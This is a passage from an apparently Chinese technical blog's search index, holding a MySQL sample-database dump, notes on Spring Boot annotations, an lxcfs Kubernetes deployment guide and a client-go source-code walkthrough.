Table structure for `customers` -- ---------------------------- DROP TABLE IF EXISTS `customers`; CREATE TABLE `customers` ( `customerNumber` int(11) NOT NULL, `customerName` varchar(50) NOT NULL, `contactLastName` varchar(50) NOT NULL, `contactFirstName` varchar(50) NOT NULL, `phone` varchar(50) NOT NULL, `addressLine1` varchar(50) NOT NULL, `addressLine2` varchar(50) DEFAULT NULL, `city` varchar(50) NOT NULL, `state` varchar(50) DEFAULT NULL, `postalCode` varchar(15) DEFAULT NULL, `country` varchar(50) NOT NULL, `salesRepEmployeeNumber` int(11) DEFAULT NULL, `creditLimit` decimal(10,2) DEFAULT NULL, PRIMARY KEY (`customerNumber`), KEY `salesRepEmployeeNumber` (`salesRepEmployeeNumber`), CONSTRAINT `customers_ibfk_1` FOREIGN KEY (`salesRepEmployeeNumber`) REFERENCES `employees` (`employeeNumber`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of customers -- ---------------------------- INSERT INTO `customers` VALUES ('103', 'Atelier graphique', 'Schmitt', 'Carine ', '40.32.2555', '54, rue Royale', null, 'Nantes', null, '44000', 'France', '1370', '21000.00'); INSERT INTO `customers` VALUES ('112', 'Signal Gift Stores', 'King', 'Jean', '7025551838', '8489 Strong St.', null, 'Las Vegas', 'NV', '83030', 'USA', '1166', '71800.00'); INSERT INTO `customers` VALUES ('114', 'Australian Collectors, Co.', 'Ferguson', 'Peter', '03 9520 4555', '636 St Kilda Road', 'Level 3', 'Melbourne', 'Victoria', '3004', 'Australia', '1611', '117300.00'); INSERT INTO `customers` VALUES ('119', 'La Rochelle Gifts', 'Labrune', 'Janine ', '40.67.8555', '67, rue des Cinquante Otages', null, 'Nantes', null, '44000', 'France', '1370', '118200.00'); INSERT INTO `customers` VALUES ('121', 'Baane Mini Imports', 'Bergulfsen', 'Jonas ', '07-98 9555', 'Erling Skakkes gate 78', null, 'Stavern', null, '4110', 'Norway', '1504', '81700.00'); INSERT INTO `customers` VALUES ('124', 'Mini Gifts Distributors Ltd.', 'Nelson', 'Susan', '4155551450', '5677 Strong St.', null, 'San Rafael', 'CA', '97562', 'USA', '1165', '210500.00'); INSERT INTO `customers` VALUES ('125', 'Havel \u0026 Zbyszek Co', 'Piestrzeniewicz', 'Zbyszek ', '(26) 642-7555', 'ul. Filtrowa 68', null, 'Warszawa', null, '01-012', 'Poland', null, '0.00'); INSERT INTO `customers` VALUES ('128', 'Blauer See Auto, Co.', 'Keitel', 'Roland', '+49 69 66 90 2555', 'Lyonerstr. 34', null, 'Frankfurt', null, '60528', 'Germany', '1504', '59700.00'); INSERT INTO `customers` VALUES ('129', 'Mini Wheels Co.', 'Murphy', 'Julie', '6505555787', '5557 North Pendale Street', null, 'San Francisco', 'CA', '94217', 'USA', '1165', '64600.00'); INSERT INTO `customers` VALUES ('131', 'Land of Toys Inc.', 'Lee', 'Kwai', '2125557818', '897 Long Airport Avenue', null, 'NYC', 'NY', '10022', 'USA', '1323', '114900.00'); INSERT INTO `customers` VALUES ('141', 'Euro+ Shopping Channel', 'Freyre', 'Diego ', '(91) 555","date":"2021-10-21","objectID":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/:5:2","tags":["MySQL"],"title":"Windows安装MySQL","uri":"/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/"},{"categories":["Java"],"content":"一些SpringBoot注解说明的学习笔记 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:0:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"一、注解详解（配备了完善的释义） @SpringBootApplication：申明让spring boot自动给程序进行必要的配置，这个配置等同于： @Configuration ，@EnableAutoConfiguration 和 @ComponentScan 三个配置。 @ResponseBody：表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，用于构建RESTful的api。在使用@RequestMapping后，返回值通常解析为跳转路径，加上@esponsebody后返回结果不会被解析为跳转路径，而是直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。 @Controller：用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。 @RestController：用于标注控制层组件(如struts中的action)，@ResponseBody和@Controller的合集。 @RequestMapping：提供路由信息，负责URL到Controller中的具体函数的映射。 @EnableAutoConfiguration：SpringBoot自动配置（auto-configuration）：尝试根据你添加的jar依赖自动配置你的Spring应用。例如，如果你的classpath下存在HSQLDB，并且你没有手动配置任何数据库连接beans，那么我们将自动配置一个内存型（in-memory）数据库”。你可以将@EnableAutoConfiguration或者@SpringBootApplication注解添加到一个@Configuration类上来选择自动配置。如果发现应用了你不想要的特定自动配置类，你可以使用@EnableAutoConfiguration注解的排除属性来禁用它们。 @ComponentScan：表示将该类自动发现扫描组件。个人理解相当于，如果扫描到有@Component、@Controller、@Service等这些注解的类，并注册为Bean，可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。 @Configuration：相当于传统的xml配置文件，如果有些第三方库需要用到xml文件，建议仍然通过@Configuration类作为项目的配置主类——可以使用@ImportResource注解加载xml配置文件。 @Import：用来导入其他配置类。 @ImportResource：用来加载xml配置文件。 @Autowired：自动导入依赖的bean @Service：一般用于修饰service层的组件 @Repository：使用@Repository注解可以确保DAO或者repositories提供异常转译，这个注解修饰的DAO或者repositories类会被ComponetScan发现并配置，同时也不需要为它们提供XML配置项。 @Bean：用@Bean标注方法等价于XML中配置的bean。 @Value：注入Spring boot application.properties配置的属性的值。示例代码： @Inject：等价于默认的@Autowired，只是没有required属性； @Component：泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。 @Bean:相当于XML中的,放在方法的上面，而不是类，意思是产生一个bean,并交给spring管理。 @AutoWired：自动导入依赖的bean。byType方式。把配置好的Bean拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。当加上（required=false）时，就算找不到bean也不报错。 @Qualifier：当有多个同一类型的Bean时，可以用@Qualifier(“name”)来指定。与@Autowired配合使用。@Qualifier限定描述符除了能根据名字进行注入，但能进行更细粒度的控制如何选择候选者，具体使用方式如下： @Resource(name=”name”,type=”type”)：没有括号内内容的话，默认byName。与@Autowired干类似的事。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:1:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"二、注解列表如下 @SpringBootApplication：包含了@ComponentScan、@Configuration和@EnableAutoConfiguration注解。其中 @ComponentScan：让spring Boot扫描到Configuration类并把它加入到程序上下文。 @Configuration ：等同于spring的XML配置文件；使用Java代码可以检查类型安全。 @EnableAutoConfiguration ：自动配置。 @ComponentScan ：组件扫描，可自动发现和装配一些Bean。 @Component可配合CommandLineRunner使用，在程序启动后执行一些基础任务。 @RestController：注解是@Controller和@ResponseBody的合集,表示这是个控制器bean,并且是将函数的返回值直 接填入HTTP响应体中,是REST风格的控制器。 @Autowired：自动导入。 @PathVariable：获取参数。 @JsonBackReference：解决嵌套外链问题。 @RepositoryRestResourcepublic：配合spring-boot-starter-data-rest使用。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:2:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"三、JPA注解 @Entity：@Table(name=”“)：表明这是一个实体类。一般用于jpa这两个注解一般一块使用，但是如果表名和实体类名相同的话，@Table可以省略 @MappedSuperClass:用在确定是父类的entity上。父类的属性子类可以继承。 @NoRepositoryBean:一般用作父类的repository，有这个注解，spring不会去实例化该repository。 @Column：如果字段名与列名相同，则可以省略。 @Id：表示该属性为主键。 @GeneratedValue(strategy = GenerationType.SEQUENCE,generator = “repair_seq”)：表示主键生成策略是sequence（可以为Auto、IDENTITY、native等，Auto表示可在多个数据库间切换），指定sequence的名字是repair_seq。 @SequenceGeneretor(name = “repair_seq”, sequenceName = “seq_repair”, allocationSize = 1)：name为sequence的名称，以便使用，sequenceName为数据库的sequence名称，两个名称可以一致。 @Transient：表示该属性并非一个到数据库表的字段的映射,ORM框架将忽略该属性。如果一个属性并非数据库表的字段映射,就务必将其标示为@Transient,否则,ORM框架默认其注解为@Basic。@Basic(fetch=FetchType.LAZY)：标记可以指定实体属性的加载方式 @JsonIgnore：作用是json序列化时将Java bean中的一些属性忽略掉,序列化和反序列化都受影响。 @JoinColumn（name=”loginId”）:一对一：本表中指向另一个表的外键。一对多：另一个表指向本表的外键。 @OneToOne、@OneToMany、@ManyToOne：对应hibernate配置文件中的一对一，一对多，多对一。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:3:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"四、springMVC相关注解 @RequestMapping：@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。 用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。该注解有六个属性： params:指定request中必须包含某些参数值是，才让该方法处理。 headers:指定request中必须包含某些指定的header值，才能让该方法处理请求。 value:指定请求的实际地址，指定的地址可以是URI Template 模式 method:指定请求的method类型， GET、POST、PUT、DELETE等 consumes:指定处理请求的提交内容类型（Content-Type），如application/json,text/html; produces:指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回 @RequestParam：用在方法的参数前面。 @RequestParam String a =request.getParameter(“a”)。 @PathVariable:路径变量。如 参数与大括号里的名字一样要相同。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:4:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"五、全局异常处理 @ControllerAdvice：包含@Component。可以被扫描到。统一处理异常。 @ExceptionHandler（Exception.class）：用在方法上面表示遇到这个异常就执行以下方法。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:5:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["Java"],"content":"六、附录 使用Annotation配合自动扫描能大幅简化Spring的配置，我们只需要保证： 每个Bean被标注为@Component并正确使用@Autowired注入； 配置类被标注为@Configuration和@ComponentScan； 所有Bean均在指定包以及子包内 @Component和@Bean和@Autowired之间的区别 https://blog.csdn.net/CW_SZDX/article/details/106868298 @Component是 spring 2.5引入的，为了摆脱通过classpath扫描根据xml方式定义的bean的方式. @Bean是spring 3.0 引入的，和 @Configuration一起工作，为了摆脱原先的xml和java config方式。 Spring管理Bean方式有两种，一种是注册Bean，一种装配Bean。 可以通过三种方式实现bean管理，一使用自动配置的方式、二使用JavaConfig的方式、三使用XML配置的方式。 @Compoent 作用就相当于 XML配置 @Component（@Controller、@Service、@Repository）:自动创建一个实例并装配到Spring容器中(放到IOC中) @Bean :手动创建一个实例，并保留在IOC中。 @Bean的好处：麻烦一点，但自定义性更强。当我们引用第三方库中的类需要装配到Spring容器时，则只能通过@Bean来实现~（因为你并不能改他的源代码在他类上加个@Component ，所以只能这么玩了。 @Autowired:织入（Spring上下文已有实例（已注入IOC），@Autowired只是取一下） @Autowired说“请给我一个该类的实例，例如，我之前用@Bean注释创建的一个实例进入IOC了”。 Spring的Java配置方式—@Configuration和@Bean实现Java配置 https://www.cnblogs.com/linjiqin/p/9655649.html @Component、@Repository 、@Service、@Controller的区别与联系 https://www.cnblogs.com/jiazhutao/p/12206448.html @Component, @Repository, @Service，@Controller的区别: @Component, @Service, @Controller, @Repository是spring注解，注解后可以被spring框架所扫描并注入到spring容器来进行管理 @Component是通用注解，其他三个注解是这个注解的拓展，并且具有了特定的功能 @Repository注解在持久层中，具有将数据库操作抛出的原生异常翻译转化为spring的持久层异常的功能。 @Controller层是spring-mvc的注解，具有将请求进行转发，重定向的功能。 @Service层是业务逻辑层注解，这个注解只是标注该类处于业务逻辑层。 用这些注解对应用进行分层之后，就能将请求处理，义务逻辑处理，数据库操作处理分离出来，为代码解耦，也方便了以后项目的维护和开发。 Spring 注释 @Autowired 和@Resource 的区别 @Autowired和@Resource都可以用来装配bean，都可以写在字段上，或者方法上。 @Autowired属于Spring的；@Resource为JSR-250标准的注释，属于J2EE的。 @Bean、@Component、 @Service、 @Repository 和 @Controller注解的区别 https://blog.csdn.net/russle/article/details/83247163 @Bean：表示一个方法实例化、配置或者初始化一个Spring IoC容器管理的新对象。 @Component: 自动被comonent扫描。 表示被注解的类会自动被component扫描 @Repository: 用于持久层，主要是数据库存储库。 @Service: 表示被注解的类是位于业务层的业务component。 @Controller:表明被注解的类是控制component，主要用于展现层 。 ","date":"2021-10-18","objectID":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/:6:0","tags":["Java"],"title":"SpringBoot注解说明","uri":"/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"本文通过lxcfs的k8s部署方式，实现容器资源隔离视图；并通过k8s参数设置了容器的shm大小 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:0:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"说明 实现容器资源隔离视图，即为容器分配cpu和内存大小，在容器内部看到的是容器资源配额，而不是宿主机全部计算资源 采用lxcfs实现容器资源隔离，并通过k8s容器化方式部署完成 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:1:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"lxcfs-webhook项目 我的lxcfs-webhook项目，点这里进入 https://github.com/bingerambo/lxcfs-admission-webhook 本项目针对lxscfs的k8s部署问题重新做了修改： custom-lxcfs-image： 重新制作了镜像 deployment： 修改了部署lxcfs配置yaml lxcfs.go： 对应lxcfs配置，修改了webhook代码 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:1:1","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"lxcfs部署准备文件 2个镜像文件分别是lxcfs和webhook，可根据我的lxcfs项目进行制作 2个so文件是lxcfs程序需用，部署时安装 Deployment文件夹下是部署配置脚本 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:1:2","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"配置 修改配置如下 红色标记为要修改处，根据实际情况修改 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:2:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"lxcfs-daemonset.yaml ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:2:1","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"deployment.yaml ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:2:2","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"部署 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:3:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"部署命令 /tmp/为要修改处，根据实际情况修改 # Deploy ## Copy lxcfs libs deployment/process_lib.sh ## Copy lxcfs remount.sh cp deployment/container_remount_lxcfs.sh /tmp/ ## Deploy lxcfs to worker nodes kubectl apply -f deployment/lxcfs-daemonset.yaml ## Install injector with lxcfs-admission-webhook deployment/install.sh kubectl apply -f deployment/deployment.yaml ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:3:1","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"业务测试 namespace: test-lxcfs为要修改处，根据实际情况修改 # Test ## Enable the namespace for injection kubectl create namespace test-lxcfs kubectl label namespace test-lxcfs lxcfs-admission-webhook=enabled ## Deploy the test deployment kubectl apply -f deployment/web.yaml ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:3:2","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"共享内存 对于k8s1.20+版本支持共享内存容器视图 通过设置kubelet的feature-gates参数实现 --feature-gates=\"SizeMemoryBackedVolumes=true\" ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:4:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"容器资源隔离视图 经过lxcfs部署安装和共享内存配置后，发现容器资源 cpu mem shm 都实现了资源视图隔离 ","date":"2021-10-08","objectID":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/:5:0","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图","uri":"/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/"},{"categories":["K8S"],"content":"K8S go-client 源码分析，k8s controller开发所需 本文参考了CSDN博主「进德」的原创文章，原文链接：https://blog.csdn.net/weixin_42663840/article/details/81699303, 并做了部分内容和注释说明修改： ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:0:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Client-go client-go 设计 可以看到client-go主要模块有： client restclient clientset dynamicclient discoveryclient informer reflactor deltafifo indexer workqueue 说明：client和workqueue源码分析不在本文中介绍。 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"设计图 由上可看出，进行k8s controller开发时，对以下几点进行定制开发： informer的resource event handler处理 对workqueue的入队和出队操作处理 如果业务需要，对resource的本地存储操作 controller自身的业务层逻辑处理 informer类图 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Informer 这里介绍常用的SharedInformer 不难看出Shared指的是多个listeners共享同一个cache，而且资源的变化会同时通知到cache和listeners。这个解释和上面图所展示的内容的是一致的，cache我们在Indexer的介绍中已经分析过了，listerners指的就是OnAdd、OnUpdate、OnDelete这些回调函数背后的对象，本文就要对Informer进行系统性的分析。我们先对上面的图做一些初步的认识： List/Watch：List是列举apiserver中对象的接口，Watch是监控apiserver资源变化的接口； Reflector：反射器，实现对apiserver指定类型对象的监控，其中反射实现的就是把监控的结果实例化成具体的对象； DeltaIFIFO：将Reflector监控的变化的对象形成一个FIFO队列，此处的Delta就是变化 LocalStore：指的就是Indexer的实现cache，这里面缓存的就是apiserver中的对象(其中有一部分可能还在DeltaFIFO中)，此时使用者再查询对象的时候就直接从cache中查找，减少了apiserver的压力； Callbacks：通知回调函数，Infomer感知的所有对象变化都是通过回调函数通知使用者(Listener)，即event_handler处理； ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:0","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"ListerWatcher ListerWatcher是一个interface类型 client-go/tools/cache/listwatch.go // ListerWatcher is any object that knows how to perform an initial list and start a watch on a resource. type ListerWatcher interface { // List should return a list type object; the Items field will be extracted, and the // ResourceVersion field will be used to start the watch in the right place. List(options metav1.ListOptions) (runtime.Object, error) // Watch should begin a watch at the specified version. Watch(options metav1.ListOptions) (watch.Interface, error) } // ListFunc knows how to list resources type ListFunc func(options metav1.ListOptions) (runtime.Object, error) // WatchFunc knows how to watch resources type WatchFunc func(options metav1.ListOptions) (watch.Interface, error) // ListWatch knows how to list and watch a set of apiserver resources. It satisfies the ListerWatcher interface. // It is a convenience function for users of NewReflector, etc. // ListFunc and WatchFunc must not be nil type ListWatch struct { ListFunc ListFunc WatchFunc WatchFunc // DisableChunking requests no chunking for this list watcher. It has no effect in Kubernetes 1.8, but in // 1.9 will allow a controller to opt out of chunking. DisableChunking bool } 需要注意一点：ListerWatcher是针对某一类对象的，比如Pod，不是所有对象的，这个在构造ListerWatcher对象的时候由apiserver的client类型决定了。 ","date":"2021-08-31","objectID":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:1","tags":["K8S"],"title":"K8S go-client 源码分析","uri":"/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Reflector // 代码源自client-go/tools/cache/reflector.go type Reflector struct { name string // 名字 metrics *reflectorMetrics // 但凡遇到metrics多半是用于做监控的，可以忽略 expectedType reflect.Type // 反射的类型，也就是要监控的对象类型，比如Pod store Store // 存储，就是DeltaFIFO，为什么，后面会有代码证明 listerWatcher ListerWatcher // 这个是用来从apiserver获取资源用的 period time.Duration // 反射器在List和Watch的时候理论上是死循环，只有出现错误才会退出 // 这个变量用在出错后多长时间再执行List和Watch，默认值是1秒钟 resyncPeriod time.Duration // 重新同步的周期，很多人肯定认为这个同步周期指的是从apiserver的同步周期 // 其实这里面同步指的是shared_informer使用者需要定期同步全量对象 ShouldResync func() bool // 如果需要同步，调用这个函数问一下，当然前提是该函数指针不为空 clock clock.Clock // 时钟 lastSyncResourceVersion string // 最后一次同步的资源版本 lastSyncResourceVersionMutex sync.RWMutex // 还专门为最后一次同步的资源版本弄了个锁 } 